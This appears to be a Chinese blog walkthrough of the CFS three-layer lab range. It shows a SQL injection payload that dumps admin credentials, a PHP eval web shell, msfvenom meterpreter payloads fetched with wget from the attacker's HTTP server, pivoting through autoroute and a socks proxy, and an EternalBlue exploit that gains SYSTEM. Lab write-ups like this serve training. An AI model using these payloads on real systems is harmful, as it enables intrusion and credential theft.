如果攻击机选用windows，就可以用Proxifier做代理连接，如果是linux可以用proxychains，这里我选择电脑本地进行代理连接

<h4 id="olcQk">新建代理服务器</h4>
![](https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917887899-72df878f-9451-4abe-8908-0ae49a299ca7.png)

<h4 id="b9hsa">新建代理规则</h4>
目标主机填靶机的第二个网段也就是我们需要代理出来的网段

<p>动作就选我们刚刚新建的代理服务器</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917955366-8addf678-843f-41a4-9715-33409cd2383d.png"></p>
<p>此时在浏览器就可以成功访问到<a target="_blank" rel="noopener" href="http://192.168.22.128/">http://192.168.22.128/</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918124362-e4e9ab5e-f2af-491d-8efa-1fdeb2d3c349.png"></p>
<p>这里有问题的是，代理很不稳定，可能是靶场环境问题哈，如果突然代理挂了就重新上线就写行了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918243912-9675fd70-9082-418d-a478-6027e294f329.png"></p>
<h2 id="ReF5w">靶机Target2的信息搜集</h2>
<h3 id="AXJpy">目录扫描</h3>
使用7kbscan进行目录扫描

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919552655-1ef4e35f-d4ca-4916-a411-4121fa18f2cb.png"></p>
<p>发现<a target="_blank" rel="noopener" href="http://192.168.22.128/robots.txt">192.168.22.128&#x2F;robots.txt</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919583566-fd7d54a3-cdb1-4d36-9a37-2b8e702f1c02.png"></p>
<p>访问<a target="_blank" rel="noopener" href="http://192.168.22.128//index.php?r=admini*">http://192.168.22.128//index.php?r=admini</a>，跳转到了登录页面</p>
<p>这里的思路就是爆破账号密码和SQL注入</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920036262-4d9c8639-1a66-4280-b2bd-78c1b9b9d171.png"></p>
<h3 id="QZgfG">SQL注入</h3>
在主页右键查看源码，在最底部发现存在SQL注入漏洞

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918483275-41d35b09-722a-4587-9295-7fbe85a05fc7.png"></p>
<p>这里代理不稳定，就选择在网上用现成的了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1%27%20union%20select%20group_concat(username),group_concat(password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39%20from%20bage_admin--+</span><br></pre></td></tr></table></figure>

<p>SQL注入注出了账号密码admin&#x2F;123qwe</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919047036-2b1e0eb0-399d-4dec-86be-50bca7f5d2c9.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919062192-702f552b-5bd1-4442-a6c3-0d7366e402c9.png"></p>
<p>用刚刚注出来的账号密码进行登录，得到第二个flag</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920178224-ff3883f4-1613-4191-a820-cf3b0960c3b7.png"></p>
<p><font style="color:rgb(0, 0, 0);">登录后发现网站使用了很多模块化文件。而且都是php文件格式，我们直接在其中的一个php文件中写入一句话木马，然后用蚁剑连接</font></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920568311-c42cac59-d1f1-4d56-9742-2dc53c1f4598.png"></p>
<p><font style="color:rgb(0, 0, 0);">注意这里的网址使用的是模块化，不能直接加在网站上，要用</font><strong><font style="color:rgb(0, 0, 0);">?r&#x3D;模块文件</font></strong><font style="color:rgb(0, 0, 0);">的方式访问模块文件，再用蚁剑连接</font></p>
<h3 id="nl12g"><font style="color:rgb(0, 0, 0);">蚁剑连接webshell</font></h3>
因为我们攻击机已经挂了代理，所以蚁剑就不需要在挂代理了

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920827337-6545d9d0-78f9-4400-843c-e6267382bae7.png"></p>
<p>发现第三个flag</p>
<p>flag{23ASfqwr4t2e}</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927608264-7dcdeede-69c8-4aa6-9729-0eb9b60142d5.png"></p>
<h2 id="eVP4T">靶机Target2内网信息搜集</h2>
<h3 id="lAO5I">查看网段情况</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>发现权限不高，www权限，发现两个网段，192.168.22.0&#x2F;24和192.168.33.0&#x2F;24，其中192.168.22.0&#x2F;24是我们当前所处的网段</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920961761-c5a98bf1-7d98-4884-85a9-f7eb66b3073e.png"></p>
<h3 id="tRN5d">探测出网情况</h3>
基于DNS协议命令：nslookup、dig、ping

<p>基于http协议命令：curl</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921100040-491acd4a-4549-4cb0-b9b8-a2c3c210d14f.png"></p>
<p>发现是不出网的</p>
<h3 id="eWr52">上传fscan探测内网情况</h3>
![](https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921175318-b86cd385-e89b-4599-8168-1e9820ef7962.png)

<p>赋予执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x fscan</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921287343-7dfcb436-d204-4bdb-aed1-601fc00f7b8d.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.33.0/24</span><br></pre></td></tr></table></figure>

<p>扫完的结果会保存在当前目录的result.txt里</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921756890-1b0e3e43-4231-4e6a-83ab-081766bc9d6c.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921798358-07bf3bce-fcc3-4713-ab9f-1c377765adb5.png"></p>
<p>结果发现内网存在第三个主机win7 Target3 192.168.33.33，开放端口135，139，445，</p>
<p><font style="color:rgb(0, 0, 0);">现在我们对这个win7是感兴趣的，因为他存在永恒之蓝，这时就需要把第三个网段192.168.33.0&#x2F;24的流量通过Target1，Target2代理出来</font></p>
<h2 id="kWdN8"><font style="color:rgb(0, 0, 0);">第三层代理</font></h2>
考虑到要用永恒之蓝打这个Target3，基于msf好用的ms17_010模块，我需要投入msf的使用

<p>先汇总一下现在代理情况</p>
<p>第一层代理</p>
<p>VPS–&gt;Target1</p>
<p>第二层代理</p>
<p>VPS-&gt;Target1–&gt;Target2</p>
<p>第三层代理</p>
<p>VPS-&gt;Target1-&gt;Target2	–&gt;Target3</p>
<p>所以第三层代理要基于第二层代理，前提是让Target2上线MSF，方法是通过第一层代理让Target2执行木马然后上线</p>
<h3 id="CWm8W">首先kali挂上第一层代理</h3>
首先kali挂上第一层代理，保证能访问到Target2

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727923124312-bfb1b6ed-bba7-409d-833c-f387f06d6e45.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924208280-ee6b0104-63e1-433a-8945-e1e634b574f7.png"></p>
<h3 id="UwGza">制作跳板</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>

<h3 id="UKNUn">开启监听</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.22.128</span><br><span class="line"><span class="built_in">set</span> lport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>因为Target2不出网，只能我们去连接他（VPS连接Target1，利用Target1间接连接Target2），所以要生成一个正向连接的木马，将木马上传到Target2，让Target1去连Target2</p>
<p>生成一个正向连接木马，在当前目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=6666 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>

<p>上传木马，并运行</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727926761435-4de56c32-84ad-4985-b647-f25034a61597.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x shell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>

<p>关闭ubuntu的防火墙</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<p>挂路由</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">background</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727926989293-922ae1e9-8be3-4866-84ee-fc6b028ca8ae.png"></p>
<p>切换proxychains4 的代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927072739-be334ef1-95f8-4ab7-b037-421f5f0de86c.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 192.168.1.131 3333</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927179555-a9e363a4-5bf7-4f16-a07f-dd770a9bf0f7.png"></p>
<p>windows7</p>
<p>永恒之蓝，开打，教程之前的博客有，只是在开启msf的时候要用代理，设置payload的时候，要用正向连接，因为win7不出网。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.33.129</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="nc03U"><font style="color:rgb(51, 51, 51);">获取win7主机权限</font></h3>
<font style="color:rgb(0, 0, 0);">发现是一台开着445端口的windows，尝试用永恒之蓝，成功拿下</font>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927389775-e5af5609-a3b6-48b2-999c-7ec441d3ff89.png"></p>
<p>成功的获取到Target3的shell，且权限为system</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927430748-0efa56ce-949c-41d5-a9d8-b0ee5868628c.png"></p>
<p>来到Target3的桌面，拿到第四个flag也是最后一个flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2wAdK32Lsd&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927516504-00a6d6fd-c828-48d2-8710-ed08d4fbd19f.png"></p>
<h2 id="dCDg9">第二层代理还是用MSF吧，NPS太不稳定了</h2>
<h3 id="ihAxi">生成木马并下载</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=5556 -f elf &gt; shell.elf </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924818428-f6f05cff-717c-4fad-91ce-09772793a70d.png"></p>
<p>因为Target1出网，所以kali在木马所在目录开一个http服务，Target1直接wget下载就行了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 7777</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924960079-0dfefd06-de1f-48ab-822f-3c113b8cec5e.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.1.131:7777/shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925013448-a5be3868-b2ba-4310-b01d-78c0a359512a.png"></p>
<h3 id="mqxZX">在kali上开启监听</h3>
进入监听模块，设置payload，及其参数，因为是反向shell，直接设置成VPS的IP

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.131</span><br><span class="line"><span class="built_in">set</span> lport 5556</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="S5YGv">回到蚁剑，运行木马</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>

<p>回到kali,看到已经反弹回来了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925578285-d23e040b-cfb8-4479-9a3d-6d6405abb50f.png"></p>
<h3 id="TBmcR">制作跳板</h3>
1、添加路由

<p>添加去往22段的路由</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>

<p>2、查看路由</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925614281-31be5e61-1d24-4436-afb5-9118c634386d.png"></p>
<p>这时候就伪造好了</p>
<p>使用background命令将meterpreter终端隐藏在后台</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>

<p>3、配置代理</p>
<p>配置代理，并设置参数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925836567-c0afcd6d-6889-4401-ae3e-b6d93cdfcff0.png"></p>
<p>4、配置kali的代理，新打开一个终端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 192.168.1.131 5555</span><br></pre></td></tr></table></figure>

<p>这样代理就ok了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/06/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83/" data-id="cm1xkpu15000030hq9t5t9q1o" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/10/06/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">前一篇</strong>
      <div class="article-nav-title">
        
          第一篇文章
        
      </div>
    </a>
  
  
    <a href="/2024/10/06/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">后一篇</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">十月 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/06/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">第一篇文章</a>
          </li>
        
          <li>
            <a href="/2024/10/06/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/06/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 suhaynn<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>